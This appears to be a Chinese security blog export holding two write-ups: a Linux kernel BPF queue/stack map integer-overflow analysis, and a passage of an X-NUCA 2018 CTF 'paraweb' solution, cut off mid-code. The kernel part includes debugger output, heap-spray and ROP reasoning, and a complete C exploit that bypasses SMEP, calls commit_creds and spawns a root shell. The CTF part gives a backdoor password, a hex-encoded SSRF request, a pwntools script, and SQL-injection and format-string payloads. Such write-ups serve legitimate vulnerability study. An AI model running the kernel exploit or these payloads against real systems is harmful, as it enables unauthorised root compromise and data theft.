value_size = map-&gt;value_size; err = -ENOMEM; value = kmalloc(value_size, GFP_USER | __GFP_NOWARN); if (!value) goto free_key; err = -EFAULT; if (copy_from_user(value, uvalue, value_size) != 0) goto free_value; /* Need to create a kthread, thus must support schedule */ if (bpf_map_is_dev_bound(map)) &#123; err = bpf_map_offload_update_elem(map, key, value, attr-&gt;flags); goto out; &#125; else if (map-&gt;map_type == BPF_MAP_TYPE_CPUMAP || map-&gt;map_type == BPF_MAP_TYPE_SOCKHASH || map-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123; err = map-&gt;ops-&gt;map_update_elem(map, key, value, attr-&gt;flags); goto out; &#125; /* must increment bpf_prog_active to avoid kprobe+bpf triggering from * inside bpf map update or delete otherwise deadlocks are possible */ preempt_disable(); __this_cpu_inc(bpf_prog_active); if (map-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH || map-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH) &#123; err = bpf_percpu_hash_update(map, key, value, attr-&gt;flags); &#125; else if (map-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY) &#123; err = bpf_percpu_array_update(map, key, value, attr-&gt;flags); &#125; else if (map-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) &#123; err = bpf_percpu_cgroup_storage_update(map, key, value, attr-&gt;flags); &#125; else if (IS_FD_ARRAY(map)) &#123; rcu_read_lock(); err = bpf_fd_array_map_update_elem(map, f.file, key, value, attr-&gt;flags); rcu_read_unlock(); &#125; else if (map-&gt;map_type == BPF_MAP_TYPE_HASH_OF_MAPS) &#123; rcu_read_lock(); err = bpf_fd_htab_map_update_elem(map, f.file, key, value, attr-&gt;flags); rcu_read_unlock(); &#125; else if (map-&gt;map_type == BPF_MAP_TYPE_REUSEPORT_SOCKARRAY) &#123; /* rcu_read_lock() is not needed */ err = bpf_fd_reuseport_array_update_elem(map, key, value, attr-&gt;flags); &#125; else if (map-&gt;map_type == BPF_MAP_TYPE_QUEUE || map-&gt;map_type == BPF_MAP_TYPE_STACK) &#123; err = map-&gt;ops-&gt;map_push_elem(map, value, attr-&gt;flags); &#125; else &#123; rcu_read_lock(); err = map-&gt;ops-&gt;map_update_elem(map, key, value, attr-&gt;flags); rcu_read_unlock(); &#125; __this_cpu_dec(bpf_prog_active); preempt_enable(); maybe_wait_bpf_programs(map);out:free_value: kfree(value);free_key: kfree(key);err_put: fdput(f); return err;&#125; 此处，实际操作的函数由之前初始化的虚表可知是queue_stack_map_push_elem，在该函数中从之前kmalloc新建的内存中，向计算得到的地址做拷贝，大小为qs-&gt;size。 123456789101112131415161718192021222324252627282930313233343536373839static int queue_stack_map_push_elem(struct bpf_map *map, void *value, u64 flags)&#123; struct bpf_queue_stack *qs = bpf_queue_stack(map); unsigned long irq_flags; int err = 0; void *dst; /* BPF_EXIST is used to force making room for a new element in case the * map is full */ bool replace = (flags &amp; BPF_EXIST); /* Check supported flags for queue and stack maps */ if (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST) return -EINVAL; raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags); if (queue_stack_map_is_full(qs)) &#123; if (!replace) &#123; err = -E2BIG; goto out; &#125; /* advance tail pointer to overwrite oldest element */ if (unlikely(++qs-&gt;tail &gt;= qs-&gt;size)) qs-&gt;tail = 0; &#125; dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;map.value_size]; memcpy(dst, value, qs-&gt;map.value_size); if (unlikely(++qs-&gt;head &gt;= qs-&gt;size)) qs-&gt;head = 0;out: raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags); return err;&#125; 计算的地址，从汇编语言中更容易看出是跳过了管理块内容的地址，qs-&gt;head在新建的时候被初始化为0，此时出现堆溢出，溢出大小可以控制即初始化是输入的value_size，位置是从新建的第一个堆块以后直接溢出。 1234567.text:FFFFFFFF811AEF71 mov edx, [rbx+20h].text:FFFFFFFF811AEF74 mov rsi, r13.text:FFFFFFFF811AEF77 xor r15d, r15d.text:FFFFFFFF811AEF7A imul ecx, edx.text:FFFFFFFF811AEF7D lea rdi, [rbx+rcx+0D0h].text:FFFFFFFF811AEF85 call memcpy; memcpy((unsigned __int64)map + (unsigned int)(map[8] * v7) + 0xD0, a2, (unsigned int)map[8]); 其功能上很容易理解，没一个map里包含多个小块内存，value_size是每一个小块的大小，max_entries是小块的数量，每次可以写一个小块内容。 漏洞利用[-] 利用默认仅采用smep保护，关闭smap、kaslr、kpti。 内核堆漏洞最大的问题是要看申请的堆块大小是多少，这是因为内核的堆管理是用的伙伴算法+slub算法，即相同kmem_cache的内存块是用同一个内存页切开的，所以造成内存块会相邻。 首先分析申请的内存大小和使用的kmem_cache，此处用动态分析更好。可以发现其申请的大小是0x100，并且采用了kmalloc-256进行分配。 1234567891011121314151617181920pwndbg&gt; b *0xFFFFFFFF8119CD17Breakpoint 2 at 0xffffffff8119cd17pwndbg&gt; cContinuing.pwndbg&gt; nipwndbg&gt; i r raxrax 0xffff88807a001700 -131389592692992pwndbg&gt; x /20gx 0xffff88807a0017000xffff88807a001700: 0x0000000000024200 0x00000000400000000xffff88807a001710: 0x0000000000000005 0x00000100000001000xffff88807a001720: 0x0000000d00000000 0x00000010000000100xffff88807a001730: 0x0000000000000010 0x00000000000000010xffff88807a001740: 0x0000000000000000 0x00000008000001000xffff88807a001750: 0x0000000000000000 0xffffffff8222db1c0xffff88807a001760: 0xffff88807a001860 0xffff88807a0016600xffff88807a001770: 0xffffffff8222db1c 0xffff88807a0018780xffff88807a001780: 0xffff88807a001678 0xffff888079b459d80xffff88807a001790: 0xffff888079b459c0 0xffffffff8246d5e0pwndbg&gt; x /s 0xffffffff8222db1c0xffffffff8222db1c: "kmalloc-256" 堆风水所谓堆风水就是根据堆分配机制，将特定的内存块分配到特定的位置去。 此处漏洞的限定条件是：1 申请的0x100大小的堆块。 2 向相邻堆块溢出。 根据漏洞利用的常用思路，找到一个0x100大小、并存在函数指针、虚表的数据结构进行喷射都可以。 这里采用的喷射（spary）就是利用伙伴算法和slub的性质，由于其位置上相同大小的堆块相邻，因此申请大量的堆块一定存在一块与发生溢出的堆块相邻，造成指针可控的情况。 常用的ptmx由于大小问题不可用，此模块中恰好有一个数据结构可以使用就是 bpf_queue_stack。 如下，其中bpf_map_ops是一个虚函数表，数据结构中恰好包括一个虚函数表指针ops，因此，利用bpf中的BPF_MAP_CREATE功能，进行喷射就可以造成虚函数表指针可控的情况。此喷射操作恰好与整数溢出触发操作相同。 数据结构： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071struct bpf_queue_stack &#123; struct bpf_map map; raw_spinlock_t lock; u32 head, tail; u32 size; /* max_entries + 1 */ char elements[0] __aligned(8);&#125;;struct bpf_map &#123; /* The first two cachelines with read-mostly members of which some * are also accessed in fast-path (e.g. ops, max_entries). */ const struct bpf_map_ops *ops ____cacheline_aligned; struct bpf_map *inner_map_meta;#ifdef CONFIG_SECURITY void *security;#endif enum bpf_map_type map_type; u32 key_size; u32 value_size; u32 max_entries; u32 map_flags; u32 pages; u32 id; int numa_node; u32 btf_key_type_id; u32 btf_value_type_id; struct btf *btf; bool unpriv_array; /* 55 bytes hole */ /* The 3rd and 4th cacheline with misc members to avoid false sharing * particularly with refcounting. */ struct user_struct *user ____cacheline_aligned; atomic_t refcnt; atomic_t usercnt; struct work_struct work; char name[BPF_OBJ_NAME_LEN];&#125;;/* map is generic key/value storage optionally accesible by eBPF programs */struct bpf_map_ops &#123; /* funcs callable from userspace (via syscall) */ int (*map_alloc_check)(union bpf_attr *attr); struct bpf_map *(*map_alloc)(union bpf_attr *attr); void (*map_release)(struct bpf_map *map, struct file *map_file); void (*map_free)(struct bpf_map *map); int (*map_get_next_key)(struct bpf_map *map, void *key, void *next_key); void (*map_release_uref)(struct bpf_map *map); /* funcs callable from userspace and from eBPF programs */ void *(*map_lookup_elem)(struct bpf_map *map, void *key); int (*map_update_elem)(struct bpf_map *map, void *key, void *value, u64 flags); int (*map_delete_elem)(struct bpf_map *map, void *key); int (*map_push_elem)(struct bpf_map *map, void *value, u64 flags); int (*map_pop_elem)(struct bpf_map *map, void *value); int (*map_peek_elem)(struct bpf_map *map, void *value); /* funcs called by prog_array and perf_event_array map */ void *(*map_fd_get_ptr)(struct bpf_map *map, struct file *map_file, int fd); void (*map_fd_put_ptr)(void *ptr); u32 (*map_gen_lookup)(struct bpf_map *map, struct bpf_insn *insn_buf); u32 (*map_fd_sys_lookup_elem)(void *ptr); void (*map_seq_show_elem)(struct bpf_map *map, void *key, struct seq_file *m); int (*map_check_btf)(const struct bpf_map *map, const struct btf_type *key_type, const struct btf_type *value_type);&#125;; 劫持控制流上述指针的偏移是0x30，当溢出超过0x30时，即可以控制该虚函数表。我们可以在用户态空间中构造一个虚函数表，将指针指向这个虚函数表。利用close函数即可以触发一个伪造的函数地址来劫持控制流。 此时的方法类似于CISCN 2017 babydriver，首先找到一个gadget来做栈迁移，预先在用户态布置好一个写好ROP的伪造内核栈空间，从而先提权，然后swapgs、iret返回用户态，打开一个shell。 选用的栈迁移gadget是： 123pwndbg&gt; x /2i 0xffffffff81954dc8 0xffffffff81954dc8: xchg esp,eax 0xffffffff81954dc9: ret 0x674 随后在0x81954dc8+0x674+8处布置其余的ROP即可。 最终，可以在开启smep的情况下提权： 1234567/ $ ./expuser_cs:33 user_ss: 2brop_payload_initializedSIGSEGV foundget shell againuid=0(root) gid=0(root)/ # EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225// gcc -o exp exp.c -static -fno-pie// This is a SMEP bypass exploit against a integer overflow vulnerability // in Linux kernel bpf module// The offset used in this exploit is against a custom compiled kernel.// exploit author: Wei Wu (ww9210@gmail.com)// modified by : P4nda (root@p4nda.xyz)// modify time : 2019-1-2 11:23:33#define _GNU_SOURCE#define SPRAY_NUMBER 14#include &lt;signal.h&gt;#include &lt;endian.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/mman.h&gt;#define native_write_cr4 0xffffffff810037d5// 0xffffffff81097fcc#define POPRDX 0xffffffff81002dda#define DUMMY 0#define PREPARE_KERNEL_CRED 0xFFFFFFFF810E3D40 //0xffffffff810e3670#define COMMIT_CREDS 0xFFFFFFFF810E3AB0 //0xffffffff810e33e0#define poprdiret 0xffffffff810013b9#define popraxret 0xffffffff81029c71#define swapgs 0xffffffff81c00d5a//0xffffffff81c0095f#define iretq 0xffffffff8106d8f4#define stack_pivot_gadget 0xffffffff81954dc8#define stack_top_offset 0x674#define krop_base_to_map 0x81954000int rop_start=0x1444-8;void* krop_base_mapped;unsigned long user_cs, user_ss, user_rflags;static void save_state()&#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "pushfq\n" "popq %2\n" : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory");&#125;void get_shell()&#123; system("id"); char *shell = "/bin/sh"; char *args[] = &#123;shell, NULL&#125;; execve(shell, args, NULL);&#125;typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;void get_root_payload(void)&#123; commit_creds(prepare_kernel_cred(0));&#125;unsigned long rop_chain[] = &#123; popraxret, 0x6f0, 0xffffffff81001c51,//native_write_cr4, poprdiret, 0, PREPARE_KERNEL_CRED, 0xffffffff81001c50, //: pop rsi ; ret poprdiret, 0xffffffff81264e0b,//: push rax; push rsi; ret; //0xffffffff812646fb, //: push rax ; push rsi ; ret COMMIT_CREDS, swapgs, 0x246, iretq, (unsigned long)&amp;get_shell, 0,//user_cs, 0,//user_rflags, 0,//krop_base_mapped + 0x4000, 0//user_ss&#125;;void * fakestack;void prepare_krop()&#123; krop_base_mapped=mmap((void *)krop_base_to_map,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); if (krop_base_mapped&lt;0)&#123; perror("mmap failed"); &#125; fakestack=mmap((void *)0xa000000000,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); *(unsigned long*)0x0000000081954dc8=popraxret; *(unsigned long*)krop_base_to_map = 0; *(unsigned long*)(krop_base_to_map+0x1000) = 0; *(unsigned long*)(krop_base_to_map+0x2000) = 0; *(unsigned long*)(krop_base_to_map+0x3000) = 0; *(unsigned long*)(krop_base_to_map+0x4000) = 0; *(unsigned long*)(krop_base_to_map+0x5000) = 0; *(unsigned long*)(krop_base_to_map+0x6000) = 0; *(unsigned long*)(krop_base_to_map+0x7000) = 0; *(unsigned long*)(fakestack+0x4000) = 0; *(unsigned long*)(fakestack+0x3000) = 0; *(unsigned long*)(fakestack+0x2000) = 0; *(unsigned long*)(fakestack+0x1000) = 0; *(unsigned long*)(fakestack) = 0; *(unsigned long*)(fakestack+0x10) = stack_pivot_gadget; *(unsigned long*)(fakestack+0x7000) = 0; *(unsigned long*)(fakestack+0x6000) = 0; *(unsigned long*)(fakestack+0x5000) = 0; rop_chain[12+2]=user_cs; rop_chain[13+2]=user_rflags; rop_chain[14+2]=(unsigned long)(fakestack + 0x6000); rop_chain[15+2]=user_ss; memcpy(krop_base_mapped+rop_start,rop_chain,sizeof(rop_chain)); puts("rop_payload_initialized");&#125;#ifndef __NR_bpf#define __NR_bpf 321#endifuint64_t r[1] = &#123;0xffffffffffffffff&#125;;// defragmentationvoid defragment()&#123; int i; FILE* fp; char name[100]; for(i=0; i&lt;200; i++)&#123; snprintf(name, 100, "xxx%d", i); fp=fopen(name,"w"); &#125;&#125;long victim[SPRAY_NUMBER];void spray()&#123; int i; for(i=0;i&lt;SPRAY_NUMBER;i++)&#123; victim[i] = syscall(__NR_bpf, 0, 0x200011c0, 0x2c); &#125; return;&#125;void get_shell_again()&#123; puts("SIGSEGV found"); puts("get shell again"); system("id"); char *shell = "/bin/sh"; char *args[] = &#123;shell, NULL&#125;; execve(shell, args, NULL);&#125;int main(void)&#123; signal(SIGSEGV,get_shell_again); //get_shell(); syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0); long res = 0; *(uint32_t*)0x200011c0 = 0x17; *(uint32_t*)0x200011c4 = 0; *(uint32_t*)0x200011c8 = 0x40; *(uint32_t*)0x200011cc = -1; *(uint32_t*)0x200011d0 = 0; *(uint32_t*)0x200011d4 = -1; *(uint32_t*)0x200011d8 = 0; *(uint8_t*)0x200011dc = 0; *(uint8_t*)0x200011dd = 0; *(uint8_t*)0x200011de = 0; *(uint8_t*)0x200011df = 0; *(uint8_t*)0x200011e0 = 0; *(uint8_t*)0x200011e1 = 0; *(uint8_t*)0x200011e2 = 0; *(uint8_t*)0x200011e3 = 0; *(uint8_t*)0x200011e4 = 0; *(uint8_t*)0x200011e5 = 0; *(uint8_t*)0x200011e6 = 0; *(uint8_t*)0x200011e7 = 0; *(uint8_t*)0x200011e8 = 0; *(uint8_t*)0x200011e9 = 0; *(uint8_t*)0x200011ea = 0; *(uint8_t*)0x200011eb = 0; save_state(); printf("user_cs:%llx user_ss: %llx\n",user_cs,user_ss); prepare_krop(); res = syscall(__NR_bpf, 0, 0x200011c0, 0x2c); if (res != -1) r[0] = res; spray(); *(uint32_t*)0x200000c0 = r[0]; *(uint64_t*)0x200000c8 = 0; *(uint64_t*)0x200000d0 = 0x20000140; *(uint64_t*)0x200000d8 = 2; uint64_t* ptr = (uint64_t*)0x20000140; ptr[0]=1; ptr[1]=2; ptr[2]=3; ptr[3]=4; ptr[4]=5; ptr[5]=6; ptr[6]=0xa000000000; ptr[7]=8; syscall(__NR_bpf, 2, 0x200000c0, 0x20); int i; *(unsigned long*)(fakestack+0x7000) = 0; *(unsigned long*)(fakestack+0x6000) = 0; *(unsigned long*)(fakestack+0x5000) = 0; for(i=0;i&lt;SPRAY_NUMBER;i++)&#123; close(victim[i]); &#125; //pause(); return 0;&#125; 其他在调试ROP时，当用iret返回用户态时，遇到了一个之前没有遇到的问题，虽然跳转到了get_shell函数，但执行第一条语句时，出现Segmentation fault，拿不到shell。最后还是问了ww9210师傅，告诉我可以加一个signal函数来catch段错误，在这个处理函数中再起shell，就可以拿到shell了，虽然不太清楚为什么，但是确实有效。]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>VULNERABILITY</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[X-NUCA'2018 Final paraweb解题思路]]></title>
    <url>%2F2018%2F12%2F06%2Fxnuca-final-paraweb%2F</url>
    <content type="text"><![CDATA[X-NUCA’2018 Final paraweb解题思路题目功能主要实现了一个Web服务器，首先需要搭建环境，附件及相关可从此处下载 需要安装的mysql-server mysql-client libmysqlclient-dev 1sudo apt-get install mysql-server mysql-client libmysqlclient-dev 并将mysql的数据库root密码设置为paranoid 进入mysql，创建一个叫shop的数据库，再导入给出的shop.sql就可以了。 题目分别实现了对GET方法及POST方法数据包的处理。 利用点1题目在GET处理请求中实现了几个额外功能： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758if ( !strcmp(haystack + 1, "login.html") )&#123; for ( i = &amp;arg_start; i &lt; &amp;content_start; i += 2 ) &#123; if ( i == &amp;arg_start ) &#123; v5 = strtok(real_url, "="); if ( !v5 ) break; v6 = strtok(0LL, "&amp;"); if ( !v6 ) break; &#125; else &#123; v5 = strtok(0LL, "="); if ( !v5 ) break; v6 = strtok(0LL, "&amp;"); if ( !v6 ) break; &#125; *i = v5; i[1] = v6; &#125; s1 = (char *)search_from_arg("username"); if ( s1 ) &#123; v8 = (const char *)search_from_arg("password"); if ( v8 ) &#123; if ( !strcmp(s1, "admin") ) &#123; if ( (unsigned int)if_passwd_correct(v8) ) &#123; v9 = (char *)search_from_arg("menu"); if ( v9 ) &#123; v10 = (const char *)search_from_arg("para"); if ( !strcmp(v9, "parsefile") ) &#123; parse_file(v10); &#125; else if ( !strcmp(v9, "request") ) &#123; request(v10); &#125; else if ( !strcmp(v9, "upload") ) &#123; v2 = (const char *)search_from_arg("filename"); upload(v10, v2); &#125; &#125; &#125; &#125; &#125; &#125;&#125; 当访问页面是login.html时，会检查是否存在username和password两个参数，当判断username的值为admin时，检查password的值，在if_passwd_correct中实现了对这段password的检查： 123456789101112131415161718signed __int64 __fastcall if_passwd_correct(const char *a1)&#123; signed int i; // [rsp+14h] [rbp-Ch] if ( strlen(a1) &gt; 0x40 || strlen(a1) &lt;= 0x13 ) return 0LL; if ( !strstr(a1, "admin") ) return 0LL; strcpy(&amp;dest, a1); strcat(&amp;dest, a1); for ( i = 0; i &lt;= 63; ++i ) &#123; if ( *(&amp;dest + i) != byte_60F300[63 - i] ) return 0LL; &#125; dword_605630 = 1; return 1LL;&#125; 首先判断字符串是否在0x13到0x40间，接着判断里面是否存在admin字样，如果存在就将这个字符串复制两次到dest中去，进行64次的循环比较，比较dest的正向与byte_60F300的逆向是否相同。 可以主要到byte_60F300与dest恰好相差0x40个字节，如果输入长度是0x40的话，那么byte_60F300是相同的，而passwd检测就是输入是否是一个长度为0x40包含admin的回文序列，最简单的构造是 1admin111111111111111111111111111111111111111111111111111111nimda 由此可以进入登录后的状态，登录后可以看到程序逻辑由menu这个键值决定，分别是parsefile（读文件）、request（发送请求）、upload（在./www/upload/里新建一个文件并输入内容）。 先看读文件， 123456789101112131415161718192021222324252627282930void __fastcall parse_file(const char *a1)&#123; char *s1; // [rsp+18h] [rbp-18h] char *s; // [rsp+20h] [rbp-10h] FILE *stream; // [rsp+28h] [rbp-8h] if ( !strcmp(ip_addr, "127.0.0.1") ) &#123; s1 = (char *)find_from_content("Credentials"); if ( s1 ) &#123; if ( !strcmp(s1, "LG GRAM") ) &#123; s = (char *)malloc(0x51uLL); stream = fopen(a1, "rb"); if ( stream ) &#123; fgets(s, 80, stream); write(1, s, 0x50uLL); fclose(stream); free(s); &#125; else &#123; perror("open failure"); &#125; &#125; &#125; &#125;&#125; 可以看到，仅要求数据包头包含 Credentials： LG GRAM这样一条值的话，就可以打开para指定的文件，并读取。 很显然这个是一个后门功能，可以直接读取flag。 但这个后门有一个限制，就是 !strcmp(ip_addr, “127.0.0.1”) ，这个ip_addr是从socket中取的，很难被控制，因此需要有别的方法来构造这样的请求。最开始就被坑在这里，让队友打了半天远程都打不出flag…. 再关注其他功能，在request这个功能中，就包含有上述操作： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172unsigned __int64 __fastcall request(const char *input)&#123; int len; // ST1C_4 size_t myinput; // rax size_t v3; // rax signed int v5; // [rsp+18h] [rbp-2B8h] int fd; // [rsp+20h] [rbp-2B0h] char *output; // [rsp+28h] [rbp-2A8h] void *ptr; // [rsp+38h] [rbp-298h] struct sockaddr addr; // [rsp+40h] [rbp-290h] char buf; // [rsp+50h] [rbp-280h] unsigned __int64 v11; // [rsp+2C8h] [rbp-8h] v11 = __readfsqword(0x28u); len = strlen(input); myinput = strlen(input); output = (char *)malloc(myinput + 32); decode_hex(output, len, (char *)input); if ( (unsigned int)sub_402876(output) == 1 ) &#123; fd = socket(2, 1, 0); if ( fd == -1 ) &#123; perror("Creating socket failed.\n"); &#125; else &#123; addr.sa_family = 2; *(_WORD *)addr.sa_data = htons(0x1F90u); *(_DWORD *)&amp;addr.sa_data[2] = inet_addr("127.0.0.1"); bzero(&amp;addr.sa_data[6], 8uLL); if ( connect(fd, &amp;addr, 0x10u) == -1 ) &#123; perror("Connection failed.\n"); &#125; else &#123; snprintf( &amp;buf, 0x200uLL, "GET /%s HTTP/1.1\r\n" "Host: 127.0.0.1\r\n" "User-Agent: ComputerVendor\r\n" "Cookie: nilnilnilnil\r\n" "Connection: close\r\n" "Identity: unknown\r\n", output); v3 = strlen(&amp;buf); if ( send(fd, &amp;buf, v3, 0) == -1 ) &#123; puts("request failed."); &#125; else &#123; ptr = malloc(0x65uLL); v5 = 0; while ( v5 &lt;= 6 ) &#123; ++v5; memset(ptr, 0, 0x64uLL); if ( (signed int)recv(fd, ptr, 0x64uLL, 0) &lt; 0 ) break; write(1, ptr, 0x64uLL); &#125; free(ptr); close(fd); &#125; &#125; &#125; &#125; return __readfsqword(0x28u) ^ v11;&#125; 首先将para中的参数进行处理，接着拼接到buf中去，并建立socket向127.0.0.1发送请求了。很显然只要数据构造得当，就可以构造出能读取flag的请求包。 看一下这个解码函数是什么 123456789101112131415161718192021222324252627282930313233343536373839404142_BYTE *__fastcall decode_hex(_BYTE *out, int len, char *in)&#123; char *v4; // rax char *v5; // rax _BYTE *v6; // rax char *now; // [rsp+8h] [rbp-38h] signed __int64 nowa; // [rsp+8h] [rbp-38h] int len_1; // [rsp+14h] [rbp-2Ch] char v10; // [rsp+2Fh] [rbp-11h] unsigned int v11; // [rsp+30h] [rbp-10h] unsigned int v12; // [rsp+34h] [rbp-Ch] _BYTE *v13; // [rsp+38h] [rbp-8h] now = in; v13 = out; if ( len &lt;= 0 ) return 0LL; len_1 = len - 1; while ( *now ) &#123; if ( !len_1 ) return 0LL; --len_1; v4 = now; nowa = (signed __int64)(now + 1); v11 = sub_403042(*v4); if ( v11 &gt; 0xF ) return 0LL; v5 = (char *)nowa; now = (char *)(nowa + 1); v12 = sub_403042(*v5); if ( v12 &gt; 0xF ) return 0LL; v10 = 16 * v11 + v12; if ( !v10 ) return 0LL; v6 = v13++; *v6 = v10; &#125; *v13 = 0; return out;&#125; 可以看到这个函数将两个字符为一组进行处理，应该全部来源于0~9a~zA~Z并最终转换成0~15，低字节*16+高字节，很显然这个是一个decode(‘hex’)操作，仅需将要伪造的包字符串进行encode(‘hex’)操作就可以了 一个简单的payload如下： 1'login.html?username=admin&amp;password=admin111111111111111111111111111111111111111111111111111111nimda&amp;menu=parsefile&amp;para=/opt/xnuca/flag.txt HTTP/1.1\r\nCredentials: LG GRAM\r\na: ' 将其转换成hex表示，并拼接到一个request请求包的para参数就可以拿到flag了，第一种EXP如下： EXP1.py123456789101112131415161718192021from pwn import *p = remote("172.17.0.1",8080)buf= '''GET /login.html?username=admin&amp;password=admin111111111111111111111111111111111111111111111111111111nimda&amp;menu=request&amp;para=6c6f67696e2e68746d6c3f757365726e616d653d61646d696e2670617373776f72643d61646d696e3131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131316e696d6461266d656e753d706172736566696c6526706172613d2f6f70742f786e7563612f666c61672e74787420485454502f312e310d0a43726564656e7469616c733a204c47204752414d0d0a613a20 HTTP/1.1Host: 127.0.0.1:8080Proxy-Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Credentials: LG GRAM'''#context.log_level = 'debug'p.send(buf)p.recvuntil('Try login in me.!\\r\\n\n')p.recvuntil('Try login in me.!\\r\\n\n')flag = p.recvline()[:-1].replace('\0','')print '[+] flag:',flagp.interactive()#'login.html?username=admin&amp;password=admin111111111111111111111111111111111111111111111111111111nimda&amp;menu=parsefile&amp;para=/opt/xnuca/flag.txt HTTP/1.1\r\nCredentials: LG GRAM\r\na: ' 利用点2说完了第一个利用，这就是一个后门操作，再看post包的处理吧 在post包中提供了两个操作，可访问cart.html和product.html 而这两个操作都构造了sql语句访问了mysql，并且都存在SQL 注入，想起被sqlmap支配的恐惧，和在国家某漏洞库实习的日子。 先看二进制漏洞，首先在cart.html中存在一个格式化字符串漏洞： 1234567891011121314151617181920212223242526if ( !strcmp(haystack + 1, "cart.html") )&#123; strtok(qword_60F450, "="); strtok(0LL, "&amp;"); s1 = strtok(0LL, "="); v16 = strtok(0LL, "&amp;"); if ( s1 &amp;&amp; v16 &amp;&amp; !strcmp(s1, "cargo") ) &#123; v17 = sub_402A21(); s = (char *)malloc(0x66uLL); snprintf(s, 0x64uLL, "SELECT md5(%s) from cargo;", v16); if ( (unsigned int)mysql_query(v17, s) ) sub_402AD7(v17); v19 = mysql_store_result(v17); if ( !v19 ) sub_402AD7(v17); mysql_fetch_row(v19); v20 = (const char **)mysql_fetch_row(v19); if ( *v20 ) -&gt; printf(*v20); else printf("%s", "(Nil)"); free(s); mysql_free_result(v19); mysql_close(v17); &#125; 而从mysql中出来的数据如何存在格式化数据呢，队里Manasseh Zhou师傅给了我一个payload： 123456789buf ="""POST /cart.html?cargo=-1); HTTP/1.1\rHost: 127.0.0.1\rUser-Agent: ComputerVendor\rCookie: nilnilnilnil\rConnection: close\rIdentity: unknown\rContent-Length: 10\r\ra=1&amp;cargo=1) union select '%75$p' ;# &amp;""" 这样就可以构造出格式化的字符串了，有了这个功能可以泄露任意内容，虽然每次程序发送一个数据包以后都会断掉连接，但是由于这个处理功能是fork出来的，因此每次泄露的内容都是不变的。 有了一大堆泄露的数据后该如何下一步攻击呢？ 再看另外一个功能： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182else if ( !strcmp(haystack + 1, "product.html") )&#123; for ( i = &amp;arg_start; i &lt; &amp;content_start; i += 2 ) &#123; if ( i == &amp;arg_start ) &#123; v13 = strtok(qword_60F450, "="); if ( !v13 ) break; v14 = strtok(0LL, "&amp;"); if ( !v14 ) break; &#125; else &#123; v13 = strtok(0LL, "="); if ( !v13 ) break; v14 = strtok(0LL, "&amp;"); if ( !v14 ) break; &#125; *i = v13; i[1] = v14; &#125; v21 = (char *)search_from_arg("id"); if ( v21 ) &#123; v22 = sub_402A21(); v3 = strlen("SELECT * FROM cargo where cargo_id="); v4 = strlen(v21); dest = (char *)malloc(v3 + v4 + 1); strcpy(dest, "SELECT * FROM cargo where cargo_id="); strcat(dest, v21); if ( (unsigned int)mysql_query(v22, dest) ) sub_402AD7(v22); v23 = mysql_store_result(v22); if ( !v23 ) sub_402AD7(v22); v11 = mysql_num_fields(v23); while ( 1 ) &#123; v24 = mysql_fetch_row(v23); if ( !v24 ) break; for ( j = 0; j &lt; v11; ++j ) &#123; if ( !j ) &#123; while ( 1 ) &#123; v25 = (_QWORD *)mysql_fetch_field(v23); if ( !v25 ) break; printf("%s ", *v25); &#125; puts("\r\n"); &#125; if ( *(_QWORD *)(8LL * j + v24) ) &#123; if ( strstr(*(const char **)(8LL * j + v24), "overdue") ) &#123; v6 = strlen(*(const char **)(8LL * j + v24)); memcpy(&amp;v26, *(const void **)(8LL * j + v24), v6 + 64); &#125; else &#123; v7 = strlen(*(const char **)(8LL * j + v24)); memcpy(&amp;v26, *(const void **)(8LL * j + v24), v7); &#125; &#125; else &#123; memcpy(&amp;v26, "(Nil)", 5uLL); &#125; printf("%s ", &amp;v26); &#125; 